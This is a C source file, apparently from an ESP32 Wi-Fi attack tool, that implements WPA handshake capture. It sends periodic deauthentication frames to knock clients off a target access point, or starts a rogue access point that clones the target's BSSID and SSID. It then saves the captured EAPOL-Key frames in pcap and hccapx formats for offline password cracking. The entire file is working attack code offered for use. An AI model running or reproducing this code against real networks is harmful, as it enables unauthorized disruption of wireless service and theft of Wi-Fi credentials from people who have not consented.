/**
 * @file attack_handshake.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-03
 * @copyright Copyright (c) 2021
 * 
 * @brief Implements handshake attacks and different available methods.
 */

#include "attack_handshake.h"

#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"
#include "esp_wifi_types.h"

#include "attack.h"
#include "wsl_bypasser.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"
#include "pcap_serializer.h"
#include "hccapx_serializer.h"

static const char *TAG = "main:attack_handshake";
static esp_timer_handle_t deauth_timer_handle;
static attack_handshake_methods_t method = -1;
static const wifi_ap_record_t *ap_record = NULL;

/**
 * @brief Callback for DATA_FRAME_EVENT_EAPOLKEY_FRAME event.
 * 
 * If EAPOL-Key frame is captured and DATA_FRAME_EVENT_EAPOLKEY_FRAME event is received from event pool, this method
 * appends the frame to status content and serialize them into pcap and hccapx format.
 * 
 * @param args not used
 * @param event_base expects FRAME_ANALYZER_EVENTS
 * @param event_id expects DATA_FRAME_EVENT_EAPOLKEY_FRAME
 * @param event_data expects wifi_promiscuous_pkt_t
 */
static void eapolkey_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    ESP_LOGI(TAG, "Got EAPoL-Key frame");
    ESP_LOGD(TAG, "Processing handshake frame...");
    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;
    attack_append_status_content(frame->payload, frame->rx_ctrl.sig_len);
    pcap_serializer_append_frame(frame->payload, frame->rx_ctrl.sig_len, frame->rx_ctrl.timestamp);
    hccapx_serializer_add_frame((data_frame_t *) frame->payload);
}

/**
 * @brief Callback for periodic deauthentication frame timer
 * 
 * Periodicaly called to send deauthentication frame for given AP
 * 
 * @param arg not used
 */
static void timer_send_deauth_frame(void* arg){
    wsl_bypasser_send_deauth_frame(ap_record);
}

/**
 * @brief Initialises ATTACK_HANDSHAKE_METHOD_BROADCAST attack method 
 * 
 * Starts periodic timer for sending deauthentication frame via timer_send_deauth_frame().
 */
static void attack_handshake_method_broadcast(){
    const esp_timer_create_args_t deauth_timer_args = {
        .callback = &timer_send_deauth_frame
    };
    ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, 5 * 1000000));
}

/**
 * @brief Initialises ATTACK_HANDSHAKE_METHOD_ROGUE_AP attack method
 * 
 * Starts duplicated AP with same BSSID as genuine AP from ap_record.
 * 
 * @note BSSID is MAC address of APs Wi-Fi interface
 */
static void attack_handshake_method_rogueap(){
    ESP_LOGD(TAG, "Configuring Rogue AP");
    wifictl_set_ap_mac(ap_record->bssid);
    wifi_config_t ap_config = {
        .ap = {
            .ssid_len = strlen((char *)ap_record->ssid),
            .channel = ap_record->primary,
            .authmode = ap_record->authmode,
            .password = "dummypassword",
            .max_connection = 1
        },
    };
    mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);
    wifictl_ap_start(&ap_config);
}

void attack_handshake_start(attack_config_t *attack_config){
    ESP_LOGI(TAG, "Starting handshake attack...");
    method = attack_config->method;
    ap_record = attack_config->ap_record;
    pcap_serializer_init();
    hccapx_serializer_init(ap_record->ssid, strlen((char *)ap_record->ssid));
    wifictl_sniffer_filter_frame_types(true, false, false);
    wifictl_sniffer_start(ap_record->primary);
    frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid);
    ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler, NULL));
    switch(attack_config->method){
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_BROADCAST");
            attack_handshake_method_broadcast();
            break;
        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_ROGUE_AP");
            attack_handshake_method_rogueap();
            break;
        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_PASSIVE");
            // No actions required. Passive handshake capture
            break;
        default:
            ESP_LOGD(TAG, "Method unknown! Fallback to ATTACK_HANDSHAKE_METHOD_PASSIVE");
    }
}

void attack_handshake_stop(){
    switch(method){
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
            esp_timer_delete(deauth_timer_handle);
            break;
        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            // No actions required.
            break;
        default:
            ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
    }
    wifictl_sniffer_stop();
    frame_analyzer_capture_stop();
    ESP_ERROR_CHECK(esp_event_handler_unregister(ESP_EVENT_ANY_BASE, ESP_EVENT_ANY_ID, &eapolkey_frame_handler));
    ap_record = NULL;
    method = -1;
    ESP_LOGD(TAG, "Handshake attack stopped");
}